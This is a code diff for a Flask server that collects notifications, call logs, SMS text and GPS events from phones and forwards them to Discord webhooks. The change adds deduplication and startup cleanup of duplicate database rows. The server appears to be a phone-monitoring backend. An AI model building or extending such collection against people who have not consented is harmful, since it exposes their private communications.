@@ -461,86 +461,151 @@ def sync_data():
     received_sms_ids = []
     received_gps_ids = []
 
-    # Process notifications
+    new_notifications = []
+    new_call_logs = []
+    new_gps_events = []
+
+    # Process notifications (with deduplication)
     for n in data.get('notifications', []):
         try:
             local_id = n.get('local_id')
             raw_ts = n.get('received_at', 0)
             received_at = datetime.fromtimestamp(raw_ts / 1000.0, tz=timezone.utc) if raw_ts > 0 else now
-            notif = Notification(
-                device_id=device_id,
-                app_package=n.get('app_package', 'unknown'),
-                app_name=decode_field(n.get('app_name')),
-                title=decode_field(n.get('title')),
-                content=decode_field(n.get('content')),
-                category=n.get('category'),
-                received_at=received_at,
-                synced_at=now
-            )
-            db.session.add(notif)
+            app_package = n.get('app_package', 'unknown')
+            title = decode_field(n.get('title'))
+            content = decode_field(n.get('content'))
+
+            # Deduplication: check if identical notification exists within 10 seconds window
+            dup = Notification.query.filter(
+                Notification.device_id == device_id,
+                Notification.app_package == app_package,
+                Notification.title == title,
+                Notification.content == content,
+                Notification.received_at >= received_at - timedelta(seconds=10),
+                Notification.received_at <= received_at + timedelta(seconds=10)
+            ).first()
+
+            if not dup:
+                notif = Notification(
+                    device_id=device_id,
+                    app_package=app_package,
+                    app_name=decode_field(n.get('app_name')),
+                    title=title,
+                    content=content,
+                    category=n.get('category'),
+                    received_at=received_at,
+                    synced_at=now
+                )
+                db.session.add(notif)
+                new_notifications.append(n)
+
             if local_id is not None:
                 received_notification_ids.append(local_id)
         except Exception as e:
             app.logger.error(f"Error parsing notification item: {e}")
 
-    # Process call logs
+    # Process call logs (with deduplication)
     for c in data.get('call_logs', []):
         try:
             local_id = c.get('local_id')
             raw_ts = c.get('occurred_at', 0)
             occurred_at = datetime.fromtimestamp(raw_ts / 1000.0, tz=timezone.utc) if raw_ts > 0 else now
-            call = CallLog(
-                device_id=device_id,
-                phone_number=decode_field(c.get('phone_number', 'unknown')),
-                contact_name=decode_field(c.get('contact_name')),
-                call_type=c.get('call_type', 'unknown'),
-                duration_sec=int(c.get('duration_sec', 0)),
-                sim_slot=c.get('sim_slot'),
-                occurred_at=occurred_at,
-                synced_at=now
-            )
-            db.session.add(call)
+            phone_number = decode_field(c.get('phone_number', 'unknown'))
+            call_type = c.get('call_type', 'unknown')
+            duration_sec = int(c.get('duration_sec', 0))
+
+            # Deduplication: check if identical call record exists within 10 seconds window
+            dup = CallLog.query.filter(
+                CallLog.device_id == device_id,
+                CallLog.phone_number == phone_number,
+                CallLog.call_type == call_type,
+                CallLog.duration_sec == duration_sec,
+                CallLog.occurred_at >= occurred_at - timedelta(seconds=10),
+                CallLog.occurred_at <= occurred_at + timedelta(seconds=10)
+            ).first()
+
+            if not dup:
+                call = CallLog(
+                    device_id=device_id,
+                    phone_number=phone_number,
+                    contact_name=decode_field(c.get('contact_name')),
+                    call_type=call_type,
+                    duration_sec=duration_sec,
+                    sim_slot=c.get('sim_slot'),
+                    occurred_at=occurred_at,
+                    synced_at=now
+                )
+                db.session.add(call)
+                new_call_logs.append(c)
+
             if local_id is not None:
                 received_call_log_ids.append(local_id)
         except Exception as e:
             app.logger.error(f"Error parsing call log item: {e}")
 
-    # Process SMS messages
+    # Process SMS messages (with deduplication)
     for s in data.get('sms_messages', []):
         try:
             local_id = s.get('local_id')
             raw_ts = s.get('occurred_at', 0)
             occurred_at = datetime.fromtimestamp(raw_ts / 1000.0, tz=timezone.utc) if raw_ts > 0 else now
-            sms = SmsMessage(
-                device_id=device_id,
-                address=decode_field(s.get('address', 'unknown')),
-                contact_name=decode_field(s.get('contact_name')),
-                body=decode_field(s.get('body')),
-                sms_type=s.get('sms_type', 'unknown'),
-                sim_slot=s.get('sim_slot'),
-                occurred_at=occurred_at,
-                synced_at=now
-            )
+            address = decode_field(s.get('address', 'unknown'))
+            body = decode_field(s.get('body'))
+            sms_type = s.get('sms_type', 'unknown')
 
-            db.session.add(sms)
+            # Deduplication: check if identical SMS exists within 10 seconds window
+            dup = SmsMessage.query.filter(
+                SmsMessage.device_id == device_id,
+                SmsMessage.address == address,
+                SmsMessage.body == body,
+                SmsMessage.sms_type == sms_type,
+                SmsMessage.occurred_at >= occurred_at - timedelta(seconds=10),
+                SmsMessage.occurred_at <= occurred_at + timedelta(seconds=10)
+            ).first()
+
+            if not dup:
+                sms = SmsMessage(
+                    device_id=device_id,
+                    address=address,
+                    contact_name=decode_field(s.get('contact_name')),
+                    body=body,
+                    sms_type=sms_type,
+                    sim_slot=s.get('sim_slot'),
+                    occurred_at=occurred_at,
+                    synced_at=now
+                )
+                db.session.add(sms)
+
             if local_id is not None:
                 received_sms_ids.append(local_id)
         except Exception as e:
             app.logger.error(f"Error parsing SMS item: {e}")
 
-    # Process GPS toggle events
+    # Process GPS toggle events (with deduplication)
     for g in data.get('gps_events', []):
         try:
             local_id = g.get('local_id')
             raw_ts = g.get('occurred_at', 0)
             occurred_at = datetime.fromtimestamp(raw_ts / 1000.0, tz=timezone.utc) if raw_ts > 0 else now
             is_enabled = bool(g.get('is_enabled'))
-            gps_entry = GpsLog(
-                device_id=device_id,
-                is_enabled=is_enabled,
-                occurred_at=occurred_at
-            )
-            db.session.add(gps_entry)
+
+            # Deduplication: check if identical GPS event exists within 10 seconds window
+            dup = GpsLog.query.filter(
+                GpsLog.device_id == device_id,
+                GpsLog.is_enabled == is_enabled,
+                GpsLog.occurred_at >= occurred_at - timedelta(seconds=10),
+                GpsLog.occurred_at <= occurred_at + timedelta(seconds=10)
+            ).first()
+
+            if not dup:
+                gps_entry = GpsLog(
+                    device_id=device_id,
+                    is_enabled=is_enabled,
+                    occurred_at=occurred_at
+                )
+                db.session.add(gps_entry)
+                new_gps_events.append(g)
+
             if local_id is not None:
                 received_gps_ids.append(local_id)
 
@@ -553,9 +618,10 @@ def sync_data():
 
     db.session.commit()
 
-    send_discord_for_notifications(data.get('notifications', []), device_id)
-    send_discord_for_calls(data.get('call_logs', []), device_id)
-    send_discord_for_gps(data.get('gps_events', []), device_id)
+    # Send Discord webhooks ONLY for genuinely new items (not duplicates)
+    send_discord_for_notifications(new_notifications, device_id)
+    send_discord_for_calls(new_call_logs, device_id)
+    send_discord_for_gps(new_gps_events, device_id)
 
     return jsonify({
         'status': 'ok',
@@ -808,9 +874,25 @@ with app.app_context():
         with db.engine.connect() as conn:
             conn.execute(text("ALTER TABLE call_logs ADD COLUMN IF NOT EXISTS sim_slot VARCHAR(64);"))
             conn.execute(text("ALTER TABLE sms_messages ADD COLUMN IF NOT EXISTS sim_slot VARCHAR(64);"))
+            # Purge existing duplicate records
+            conn.execute(text("""
+                DELETE FROM sms_messages WHERE id NOT IN (
+                    SELECT MIN(id) FROM sms_messages GROUP BY device_id, address, body, occurred_at
+                );
+            """))
+            conn.execute(text("""
+                DELETE FROM call_logs WHERE id NOT IN (
+                    SELECT MIN(id) FROM call_logs GROUP BY device_id, phone_number, call_type, duration_sec, occurred_at
+                );
+            """))
+            conn.execute(text("""
+                DELETE FROM notifications WHERE id NOT IN (
+                    SELECT MIN(id) FROM notifications GROUP BY device_id, app_package, title, content, received_at
+                );
+            """))
             conn.commit()
-    except Exception:
-        pass
+    except Exception as e:
+        app.logger.warning(f"Startup DB migration/cleanup warning: {e}")
 
 
 if __name__ == '__main__':
